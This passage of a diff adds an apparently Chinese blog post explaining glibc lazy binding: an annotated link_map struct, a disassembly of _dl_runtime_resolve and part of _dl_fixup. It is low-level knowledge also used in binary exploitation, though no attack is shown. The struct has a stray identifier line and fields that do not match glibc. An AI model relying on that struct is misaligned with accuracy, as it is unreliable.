+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">ElfW</span><span class="p">(</span><span class="n">Addr</span><span class="p">)</span> <span class="n">l_addr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 指向共享对象的绝对文件名的字符串指针
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// 用于标识该共享对象是从哪个文件加载的
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">char</span> <span class="o">*</span><span class="n">l_name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 指向共享对象的动态节（.dynamic 节）的指针
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// 动态节包含了共享对象动态链接相关的重要信息，如符号表、重定位表位置等
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">ElfW</span><span class="p">(</span><span class="n">Dyn</span><span class="p">)</span> <span class="o">*</span><span class="n">l_ld</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 指向下一个加载的共享对象的 link_map 指针
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// 用于将所有已加载的共享对象连接成一个双向链表
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">struct</span> <span class="n">link_map</span> <span class="o">*</span><span class="n">l_next</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 指向前一个加载的共享对象的 link_map 指针
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// 用于将所有已加载的共享对象连接成一个双向链表
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">struct</span> <span class="n">link_map</span> <span class="o">*</span><span class="n">l_prev</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 本地符号查找的缓存指针
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// 可以提高本地符号查找的效率，减少遍历符号表的次数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">struct</span> <span class="n">symtab_cache</span> <span class="o">*</span><span class="n">l_local_cache</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 全局符号查找的缓存指针
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// 可以提高全局符号查找的效率，减少遍历符号表的次数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">struct</span> <span class="n">symtab_cache</span> <span class="o">*</span><span class="n">l_global_cache</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">l_gnu_chain_zero</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 只读重定位（RELRO）段的起始地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// RELRO 段包含程序加载时已完成重定位的只读数据，有助于提高程序安全性
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">ElfW</span><span class="p">(</span><span class="n">Addr</span><span class="p">)</span> <span class="n">l_relro_addr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 只读重定位（RELRO）段的大小
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">ElfW</span><span class="p">(</span><span class="n">Addr</span><span class="p">)</span> <span class="n">l_relro_size</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 共享对象初始化函数的地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// 在共享对象加载后，动态链接器会调用此函数进行初始化操作
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">ElfW</span><span class="p">(</span><span class="n">Addr</span><span class="p">)</span> <span class="n">l_init</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 共享对象终止函数的地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// 在共享对象卸载前，动态链接器会调用此函数进行清理操作
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">ElfW</span><span class="p">(</span><span class="n">Addr</span><span class="p">)</span> <span class="n">l_fini</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 指向实际的 link_map
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// 在某些情况下可能存在代理或虚拟的 link_map，l_real 指向真正的共享对象信息
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">struct</span> <span class="n">link_map</span> <span class="o">*</span><span class="n">l_real</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 共享对象的类型，如可执行文件、共享库等
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// 可以通过不同的值来区分不同类型的加载对象
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">int</span> <span class="n">l_type</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">...</span> <span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span></code></pre></div></li>
+</ul>
+
+
+<h5 class="relative group">细节流程 
+    <div id="%E7%BB%86%E8%8A%82%E6%B5%81%E7%A8%8B" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#%E7%BB%86%E8%8A%82%E6%B5%81%E7%A8%8B" aria-label="锚点">#</a>
+    </span>        
+    
+</h5>
+<p>1.跳转到_dl_runtime_resolve函数后，保存各个寄存器数据，然后<code>call _dl_fixup</code> 这个函数，获取到真实的地址，把地址保存在 <code>r11</code> 寄存器中，把相关数据恢复后，直接 <code>jmp r11</code>。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">_dl_runtime_resolve_xsavec</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00007ffff7fe7bc0</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">endbr64</span> 
+</span></span><span class="line"><span class="cl">   <span class="mi">0x00007ffff7fe7bc4</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">push</span>   <span class="no">rbx</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00007ffff7fe7bc5</span> <span class="err">&lt;+</span><span class="mi">5</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rbx</span><span class="p">,</span><span class="no">rsp</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00007ffff7fe7bc8</span> <span class="err">&lt;+</span><span class="mi">8</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">and</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0xffffffffffffffc0</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00007ffff7fe7bcc</span> <span class="err">&lt;+</span><span class="mi">12</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">sub</span>    <span class="no">rsp</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x14b35</span><span class="p">]</span>        <span class="c1"># 0x7ffff7ffc708 &lt;_rtld_global_ro+232&gt;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00007ffff7fe7bd3</span> <span class="err">&lt;+</span><span class="mi">19</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rsp</span><span class="p">],</span><span class="no">rax</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00007ffff7fe7bd7</span> <span class="err">&lt;+</span><span class="mi">23</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">0x8</span><span class="p">],</span><span class="no">rcx</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00007ffff7fe7bdc</span> <span class="err">&lt;+</span><span class="mi">28</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">0x10</span><span class="p">],</span><span class="no">rdx</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00007ffff7fe7be1</span> <span class="err">&lt;+</span><span class="mi">33</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">0x18</span><span class="p">],</span><span class="no">rsi</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00007ffff7fe7be6</span> <span class="err">&lt;+</span><span class="mi">38</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">0x20</span><span class="p">],</span><span class="no">rdi</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00007ffff7fe7beb</span> <span class="err">&lt;+</span><span class="mi">43</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">0x28</span><span class="p">],</span><span class="no">r8</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00007ffff7fe7bf0</span> <span class="err">&lt;+</span><span class="mi">48</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">0x30</span><span class="p">],</span><span class="no">r9</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00007ffff7fe7bf5</span> <span class="err">&lt;+</span><span class="mi">53</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0xee</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00007ffff7fe7bfa</span> <span class="err">&lt;+</span><span class="mi">58</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">xor</span>    <span class="no">edx</span><span class="p">,</span><span class="no">edx</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00007ffff7fe7bfc</span> <span class="err">&lt;+</span><span class="mi">60</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">0x250</span><span class="p">],</span><span class="no">rdx</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00007ffff7fe7c04</span> <span class="err">&lt;+</span><span class="mi">68</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">0x258</span><span class="p">],</span><span class="no">rdx</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00007ffff7fe7c0c</span> <span class="err">&lt;+</span><span class="mi">76</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">0x260</span><span class="p">],</span><span class="no">rdx</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00007ffff7fe7c14</span> <span class="err">&lt;+</span><span class="mi">84</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">0x268</span><span class="p">],</span><span class="no">rdx</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00007ffff7fe7c1c</span> <span class="err">&lt;+</span><span class="mi">92</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">0x270</span><span class="p">],</span><span class="no">rdx</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00007ffff7fe7c24</span> <span class="err">&lt;+</span><span class="mi">100</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">0x278</span><span class="p">],</span><span class="no">rdx</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00007ffff7fe7c2c</span> <span class="err">&lt;+</span><span class="mi">108</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">xsavec</span> <span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">0x40</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00007ffff7fe7c31</span> <span class="err">&lt;+</span><span class="mi">113</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rsi</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbx</span><span class="err">+</span><span class="mi">0x10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00007ffff7fe7c35</span> <span class="err">&lt;+</span><span class="mi">117</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbx</span><span class="err">+</span><span class="mi">0x8</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">=&gt;</span> <span class="err">0</span><span class="nf">x00007ffff7fe7c39</span> <span class="err">&lt;+</span><span class="mi">121</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">call</span>   <span class="mh">0x7ffff7fe00c0</span> <span class="p">&lt;</span><span class="no">_dl_fixup</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00007ffff7fe7c3e</span> <span class="err">&lt;+</span><span class="mi">126</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">r11</span><span class="p">,</span><span class="no">rax</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00007ffff7fe7c41</span> <span class="err">&lt;+</span><span class="mi">129</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0xee</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00007ffff7fe7c46</span> <span class="err">&lt;+</span><span class="mi">134</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">xor</span>    <span class="no">edx</span><span class="p">,</span><span class="no">edx</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00007ffff7fe7c48</span> <span class="err">&lt;+</span><span class="mi">136</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">xrstor</span> <span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">0x40</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00007ffff7fe7c4d</span> <span class="err">&lt;+</span><span class="mi">141</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">r9</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">0x30</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00007ffff7fe7c52</span> <span class="err">&lt;+</span><span class="mi">146</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">r8</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">0x28</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00007ffff7fe7c57</span> <span class="err">&lt;+</span><span class="mi">151</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">0x20</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00007ffff7fe7c5c</span> <span class="err">&lt;+</span><span class="mi">156</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rsi</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">0x18</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00007ffff7fe7c61</span> <span class="err">&lt;+</span><span class="mi">161</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">0x10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00007ffff7fe7c66</span> <span class="err">&lt;+</span><span class="mi">166</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rcx</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">0x8</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00007ffff7fe7c6b</span> <span class="err">&lt;+</span><span class="mi">171</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rsp</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00007ffff7fe7c6f</span> <span class="err">&lt;+</span><span class="mi">175</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rsp</span><span class="p">,</span><span class="no">rbx</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00007ffff7fe7c72</span> <span class="err">&lt;+</span><span class="mi">178</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rbx</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rsp</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00007ffff7fe7c76</span> <span class="err">&lt;+</span><span class="mi">182</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">add</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x18</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00007ffff7fe7c7a</span> <span class="err">&lt;+</span><span class="mi">186</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">bnd</span> <span class="no">jmp</span> <span class="no">r11</span>
+</span></span><span class="line"><span class="cl"><span class="nf">End</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">dump.</span>
+</span></span></code></pre></div><ol start="2">
+<li>
+<p>_dl_fixup函数：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">DL_FIXUP_VALUE_TYPE</span>
+</span></span><span class="line"><span class="cl"><span class="n">attribute_hidden</span> <span class="nf">__attribute</span> <span class="p">((</span><span class="n">noinline</span><span class="p">))</span> <span class="n">ARCH_FIXUP_ATTRIBUTE</span>
+</span></span><span class="line"><span class="cl"><span class="nf">_dl_fixup</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl"><span class="cp"># ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>	   <span class="n">ELF_MACHINE_RUNTIME_FIXUP_ARGS</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="cp"># endif
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>	   <span class="k">struct</span> <span class="n">link_map</span> <span class="o">*</span><span class="n">l</span><span class="p">,</span> <span class="nf">ElfW</span><span class="p">(</span><span class="n">Word</span><span class="p">)</span> <span class="n">reloc_arg</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// 这里的l是二进制程序本身的link_map，而不是so的
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// 第二个参数即为push n，所查找的符号在重定位表.rel.plt中的索引
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// 首先根据link_map中记录的信息，找到动态链接相关的符号表和字符串表
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">const</span> <span class="nf">ElfW</span><span class="p">(</span><span class="n">Sym</span><span class="p">)</span> <span class="o">*</span><span class="k">const</span> <span class="n">symtab</span>
+</span></span><span class="line"><span class="cl">    <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="nf">D_PTR</span> <span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">l_info</span><span class="p">[</span><span class="n">DT_SYMTAB</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">strtab</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="nf">D_PTR</span> <span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">l_info</span><span class="p">[</span><span class="n">DT_STRTAB</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="c1">// 找到对应的重定位元素、符号表、字符串
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">const</span> <span class="n">PLTREL</span> <span class="o">*</span><span class="k">const</span> <span class="n">reloc</span>
+</span></span><span class="line"><span class="cl">    <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="nf">D_PTR</span> <span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">l_info</span><span class="p">[</span><span class="n">DT_JMPREL</span><span class="p">])</span> <span class="o">+</span> <span class="n">reloc_offset</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">const</span> <span class="nf">ElfW</span><span class="p">(</span><span class="n">Sym</span><span class="p">)</span> <span class="o">*</span><span class="n">sym</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">symtab</span><span class="p">[</span><span class="nf">ELFW</span><span class="p">(</span><span class="n">R_SYM</span><span class="p">)</span> <span class="p">(</span><span class="n">reloc</span><span class="o">-&gt;</span><span class="n">r_info</span><span class="p">)];</span>
+</span></span><span class="line"><span class="cl">  <span class="k">const</span> <span class="nf">ElfW</span><span class="p">(</span><span class="n">Sym</span><span class="p">)</span> <span class="o">*</span><span class="n">refsym</span> <span class="o">=</span> <span class="n">sym</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// rel_addr 即为got表的地址，在查找到符号真实地址之后会回填到这个地址中
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">void</span> <span class="o">*</span><span class="k">const</span> <span class="n">rel_addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">l</span><span class="o">-&gt;</span><span class="n">l_addr</span> <span class="o">+</span> <span class="n">reloc</span><span class="o">-&gt;</span><span class="n">r_offset</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">lookup_t</span> <span class="n">result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">DL_FIXUP_VALUE_TYPE</span> <span class="n">value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="cm">/* Sanity check that we&#39;re really looking at a PLT relocation.  */</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">assert</span> <span class="p">(</span><span class="nf">ELFW</span><span class="p">(</span><span class="n">R_TYPE</span><span class="p">)(</span><span class="n">reloc</span><span class="o">-&gt;</span><span class="n">r_info</span><span class="p">)</span> <span class="o">==</span> <span class="n">ELF_MACHINE_JMP_SLOT</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="cm">/* Look up the target symbol.  If the normal lookup rules are not
+</span></span></span><span class="line"><span class="cl"><span class="cm">      used don&#39;t look in the global scope.  */</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nf">__builtin_expect</span> <span class="p">(</span><span class="nf">ELFW</span><span class="p">(</span><span class="n">ST_VISIBILITY</span><span class="p">)</span> <span class="p">(</span><span class="n">sym</span><span class="o">-&gt;</span><span class="n">st_other</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">const</span> <span class="k">struct</span> <span class="n">r_found_version</span> <span class="o">*</span><span class="n">version</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">l</span><span class="o">-&gt;</span><span class="n">l_info</span><span class="p">[</span><span class="nf">VERSYMIDX</span> <span class="p">(</span><span class="n">DT_VERSYM</span><span class="p">)]</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">	  <span class="k">const</span> <span class="nf">ElfW</span><span class="p">(</span><span class="n">Half</span><span class="p">)</span> <span class="o">*</span><span class="n">vernum</span> <span class="o">=</span>
+</span></span><span class="line"><span class="cl">	    <span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="nf">D_PTR</span> <span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">l_info</span><span class="p">[</span><span class="nf">VERSYMIDX</span> <span class="p">(</span><span class="n">DT_VERSYM</span><span class="p">)]);</span>
+</span></span><span class="line"><span class="cl">	  <span class="nf">ElfW</span><span class="p">(</span><span class="n">Half</span><span class="p">)</span> <span class="n">ndx</span> <span class="o">=</span> <span class="n">vernum</span><span class="p">[</span><span class="nf">ELFW</span><span class="p">(</span><span class="n">R_SYM</span><span class="p">)</span> <span class="p">(</span><span class="n">reloc</span><span class="o">-&gt;</span><span class="n">r_info</span><span class="p">)]</span> <span class="o">&amp;</span> <span class="mh">0x7fff</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	  <span class="n">version</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">l</span><span class="o">-&gt;</span><span class="n">l_versions</span><span class="p">[</span><span class="n">ndx</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">	  <span class="k">if</span> <span class="p">(</span><span class="n">version</span><span class="o">-&gt;</span><span class="n">hash</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	    <span class="n">version</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="cm">/* We need to keep the scope around so do some locking.  This is
+</span></span></span><span class="line"><span class="cl"><span class="cm">	 not necessary for objects which cannot be unloaded or when
+</span></span></span><span class="line"><span class="cl"><span class="cm">	 we are not using any threads (yet).  */</span>
+</span></span><span class="line"><span class="cl">      <span class="kt">int</span> <span class="n">flags</span> <span class="o">=</span> <span class="n">DL_LOOKUP_ADD_DEPENDENCY</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">RTLD_SINGLE_THREAD_P</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">	  <span class="nf">THREAD_GSCOPE_SET_FLAG</span> <span class="p">();</span>
